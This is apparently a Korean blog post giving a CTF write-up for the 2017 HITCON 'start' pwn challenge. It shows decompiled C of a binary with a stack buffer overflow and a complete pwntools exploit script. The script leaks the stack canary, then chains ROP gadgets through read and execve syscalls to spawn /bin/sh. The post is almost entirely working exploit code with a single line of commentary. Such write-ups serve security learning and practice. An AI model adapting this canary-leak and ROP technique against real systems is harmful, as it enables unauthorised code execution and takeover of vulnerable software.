---
title: "2017 HITCON start"
date: 2020-1-18
tags: [hitcon]
categories: [HITCON]
---

statically linked파일이라 웬만한 가젯들 다 있었다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-20h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  alarm(10LL, argv, envp);
  setvbuf(stdin, 0LL, 2LL, 0LL);
  setvbuf(stdout, 0LL, 2LL, 0LL);
  while ( read(0LL, &v4, 217LL) != 0 && strncmp(&v4, "exit\n", 5LL) )
    puts(&v4);
  return 0;
}
```

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./start')
p = process('./start')
libc = e.libc
prdi = 0x00000000004005d5 # pop rdi ; ret
prsi = 0x00000000004017f7 # pop rsi ; ret
prdx = 0x0000000000443776 # pop rdx ; ret
syscall = 0x00468e75 # syscall
prax_rdx_rbx = 0x0047a6e6 # pop rax ; pop rdx ; pop rbx ; ret  ;
p.send('A'*25)
p.recvuntil('A'*24)
canary = u64(p.recv(8)) - 0x41
log.info('Canary : ' + hex(canary))

payload = 'A'*24
payload += p64(canary)
payload += 'A'*8
payload += p64(prax_rdx_rbx) + p64(0) + p64(10) + p64(0)
payload += p64(prdi) + p64(0)
payload += p64(prsi) + p64(e.bss() + 0x500)
payload += p64(syscall)
payload += p64(prax_rdx_rbx) + p64(59) + p64(0) + p64(0)
payload += p64(prdi) + p64(e.bss() + 0x500)
payload += p64(prsi) + p64(0)
payload += p64(syscall)

p.send(payload)
p.sendline('exit')
p.sendline('/bin/sh\x00')

p.interactive()
```

